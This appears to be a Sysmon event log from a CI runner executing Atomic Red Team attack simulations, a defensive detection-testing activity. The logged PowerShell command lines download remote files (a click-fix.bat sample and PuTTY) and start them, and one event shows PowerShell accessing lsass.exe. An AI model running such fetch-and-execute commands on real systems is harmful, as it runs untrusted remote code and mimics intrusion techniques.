TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_wuzxp5v4.z04.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:15 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:15.974
ProcessGuid: {f995aebf-62d3-6942-0404-000000000e00}
ProcessId: 5840
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_wuzxp5v4.z04.ps1
CreationUtcTime: 2025-12-17 07:59:15.974
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:15 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:15.506
ProcessGuid: {f995aebf-62d3-6942-0204-000000000e00}
ProcessId: 9228
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_runb0myw.cfg.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:15 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:15.484
ProcessGuid: {f995aebf-62d3-6942-0204-000000000e00}
ProcessId: 9228
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_runb0myw.cfg.ps1
CreationUtcTime: 2025-12-17 07:59:15.484
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:15 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:15.097
ProcessGuid: {f995aebf-62d2-6942-ff03-000000000e00}
ProcessId: 576
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_yutajw2t.pop.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:15 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:15.073
ProcessGuid: {f995aebf-62d2-6942-ff03-000000000e00}
ProcessId: 576
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_yutajw2t.pop.ps1
CreationUtcTime: 2025-12-17 07:59:15.073
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:14 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:14.789
ProcessGuid: {f995aebf-62d2-6942-fd03-000000000e00}
ProcessId: 868
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\a.exe
Hashes: SHA256=16CBE40FB24CE2D422AFDDB5A90A5801CED32EF52C22C2FC77B25A90837F28AD
IsExecutable: true
Archived: true"
"12/17/2025 7:59:14 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:14.595
ProcessGuid: {f995aebf-62d2-6942-fd03-000000000e00}
ProcessId: 868
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ytzuqhzn.xxu.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:14 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:14.573
ProcessGuid: {f995aebf-62d2-6942-fd03-000000000e00}
ProcessId: 868
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ytzuqhzn.xxu.ps1
CreationUtcTime: 2025-12-17 07:59:14.573
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:14 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:14.101
ProcessGuid: {f995aebf-62d1-6942-fb03-000000000e00}
ProcessId: 2852
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_cw5gszca.w0r.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:14 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:14.079
ProcessGuid: {f995aebf-62d1-6942-fb03-000000000e00}
ProcessId: 2852
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_cw5gszca.w0r.ps1
CreationUtcTime: 2025-12-17 07:59:14.079
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:13 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:13.781
ProcessGuid: {f995aebf-62d1-6942-f903-000000000e00}
ProcessId: 5560
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\PotentiallyUnwanted.exe
Hashes: SHA256=42D6581DD0A2BA9BEC6A40C5B7C85870A8019D7347C9130D24752EC5865F0732
IsExecutable: true
Archived: true"
"12/17/2025 7:59:13 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:13.586
ProcessGuid: {f995aebf-62d1-6942-f903-000000000e00}
ProcessId: 5560
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_s3oihgjs.jux.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:13 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:13.565
ProcessGuid: {f995aebf-62d1-6942-f903-000000000e00}
ProcessId: 5560
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_s3oihgjs.jux.ps1
CreationUtcTime: 2025-12-17 07:59:13.565
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:13 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:13.034
ProcessGuid: {f995aebf-62d0-6942-f703-000000000e00}
ProcessId: 9628
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_trld01im.p4g.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:13 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:13.014
ProcessGuid: {f995aebf-62d0-6942-f703-000000000e00}
ProcessId: 9628
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_trld01im.p4g.ps1
CreationUtcTime: 2025-12-17 07:59:13.014
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:12 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:12.535
ProcessGuid: {f995aebf-62d0-6942-f503-000000000e00}
ProcessId: 1236
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_w2cpofi0.rnh.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:12 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:12.514
ProcessGuid: {f995aebf-62d0-6942-f503-000000000e00}
ProcessId: 1236
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_w2cpofi0.rnh.ps1
CreationUtcTime: 2025-12-17 07:59:12.514
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:12 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 07:59:12.186
SourceProcessGUID: {f995aebf-62cf-6942-f303-000000000e00}
SourceProcessId: 5352
SourceThreadId: 7288
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetProcessGUID: {f995aebf-5f5c-6942-0d00-000000000e00}
TargetProcessId: 992
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1410
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+3fba6|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+34fab0|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2cd8fe|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2ccd3f|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2ccc76|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2cbdf0|UNKNOWN(00007FFC990C0981)
SourceUser: runnervm8j6r3\runneradmin
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 7:59:11 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:11.982
ProcessGuid: {f995aebf-62cf-6942-f303-000000000e00}
ProcessId: 5352
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_k2ry1sxf.0s0.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:11 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:11.960
ProcessGuid: {f995aebf-62cf-6942-f303-000000000e00}
ProcessId: 5352
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_k2ry1sxf.0s0.ps1
CreationUtcTime: 2025-12-17 07:59:11.960
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:11 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:11.589
ProcessGuid: {f995aebf-62cf-6942-ef03-000000000e00}
ProcessId: 7372
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_2aoscy4m.qc1.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:11 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:11.558
ProcessGuid: {f995aebf-62cf-6942-ef03-000000000e00}
ProcessId: 7372
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_2aoscy4m.qc1.ps1
CreationUtcTime: 2025-12-17 07:59:11.558
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:11 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:11.189
ProcessGuid: {f995aebf-62cf-6942-ed03-000000000e00}
ProcessId: 5324
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_abn1qfe3.2hx.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:11 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:11.167
ProcessGuid: {f995aebf-62cf-6942-ed03-000000000e00}
ProcessId: 5324
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_abn1qfe3.2hx.ps1
CreationUtcTime: 2025-12-17 07:59:11.167
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:10 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:10.479
ProcessGuid: {f995aebf-62ce-6942-e803-000000000e00}
ProcessId: 6060
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_r52ji0tf.2sc.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:10 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:10.453
ProcessGuid: {f995aebf-62ce-6942-e803-000000000e00}
ProcessId: 6060
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_r52ji0tf.2sc.ps1
CreationUtcTime: 2025-12-17 07:59:10.453
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:08 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 07:59:05.803
ProcessGuid: {f995aebf-62c9-6942-dc03-000000000e00}
ProcessId: 4620
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:07 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:59:05.807
ProcessGuid: {f995aebf-62c9-6942-dc03-000000000e00}
ProcessId: 4620
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 53487
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.108.133
DestinationHostname: cdn-185-199-108-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 7:59:05 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:05.578
ProcessGuid: {f995aebf-62c9-6942-dc03-000000000e00}
ProcessId: 4620
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_1k0xduug.ek3.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:05 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:05.556
ProcessGuid: {f995aebf-62c9-6942-dc03-000000000e00}
ProcessId: 4620
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_1k0xduug.ek3.ps1
CreationUtcTime: 2025-12-17 07:59:05.556
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:05 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:05.478
ProcessGuid: {f995aebf-62c9-6942-dc03-000000000e00}
ProcessId: 4620
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {$url = \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/click-fix.bat\""""
$outfile = \""""$env:TEMP\click-fix.bat\""""
Invoke-WebRequest -Uri $url -OutFile $outfile -UseBasicParsing
$process = Start-Process -FilePath $outfile -PassThru -WindowStyle Normal
$process.Id | Out-File \""""$env:TEMP\click-fix-pid.txt\""""}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-5a02-000000000e00}
ParentProcessId: 7900
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\76082473-4233-4a75-96ef-919776028fb6.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:05 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:05.055
ProcessGuid: {f995aebf-62c8-6942-da03-000000000e00}
ProcessId: 1428
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_pjr0fy5k.bs3.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:05 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:05.030
ProcessGuid: {f995aebf-62c8-6942-da03-000000000e00}
ProcessId: 1428
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_pjr0fy5k.bs3.ps1
CreationUtcTime: 2025-12-17 07:59:05.030
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:04 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:04.444
ProcessGuid: {f995aebf-62c8-6942-d803-000000000e00}
ProcessId: 4504
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_2jg21yzq.ali.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:04 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:04.412
ProcessGuid: {f995aebf-62c8-6942-d803-000000000e00}
ProcessId: 4504
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_2jg21yzq.ali.ps1
CreationUtcTime: 2025-12-17 07:59:04.412
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:57 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:58:57.743
ProcessGuid: {f995aebf-62c1-6942-d603-000000000e00}
ProcessId: 5064
Image: C:\Users\RUNNER~1\AppData\Local\Temp\a.exe
FileVersion: Release 0.83 (with embedded help)
Description: SSH, Telnet, Rlogin, and SUPDUP client
Product: PuTTY suite
Company: Simon Tatham
OriginalFileName: PuTTY
CommandLine: ""C:\Users\RUNNER~1\AppData\Local\Temp\a.exe"" 
CurrentDirectory: C:\Windows\System32\WindowsPowerShell\v1.0\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=16CBE40FB24CE2D422AFDDB5A90A5801CED32EF52C22C2FC77B25A90837F28AD
ParentProcessGuid: {f995aebf-62bd-6942-d203-000000000e00}
ParentProcessId: 1620
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;iwr https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe -outfile $env:TEMP\a.exe;start-process $env:TEMP\a.exe
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:56 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:58:54.848
ProcessGuid: {f995aebf-62bd-6942-d203-000000000e00}
ProcessId: 1620
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 53480
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 93.93.131.124
DestinationHostname: the.earth.li
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 7:58:56 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 07:58:54.768
ProcessGuid: {f995aebf-62bd-6942-d203-000000000e00}
ProcessId: 1620
QueryName: the.earth.li
QueryStatus: 0
QueryResults: ::ffff:93.93.131.124;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:56 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 07:58:53.837
ProcessGuid: {f995aebf-62bd-6942-d003-000000000e00}
ProcessId: 1832
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:55 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:58:53.841
ProcessGuid: {f995aebf-62bd-6942-d003-000000000e00}
ProcessId: 1832
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 53479
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.108.133
DestinationHostname: cdn-185-199-108-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 7:58:55 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:58:55.187
ProcessGuid: {f995aebf-62bd-6942-d203-000000000e00}
ProcessId: 1620
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\a.exe
CreationUtcTime: 2025-12-17 07:58:55.187
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:54 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:58:52.316
ProcessGuid: {f995aebf-62bb-6942-ce03-000000000e00}
ProcessId: 3188
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 53478
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.108.133
DestinationHostname: cdn-185-199-108-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 7:58:54 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:54.546
ProcessGuid: {f995aebf-62bd-6942-d203-000000000e00}
ProcessId: 1620
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_qnbaywky.yu5.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:54 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:58:54.526
ProcessGuid: {f995aebf-62bd-6942-d203-000000000e00}
ProcessId: 1620
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_qnbaywky.yu5.ps1
CreationUtcTime: 2025-12-17 07:58:54.526
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:54 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 07:58:52.311
ProcessGuid: {f995aebf-62bb-6942-ce03-000000000e00}
ProcessId: 3188
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
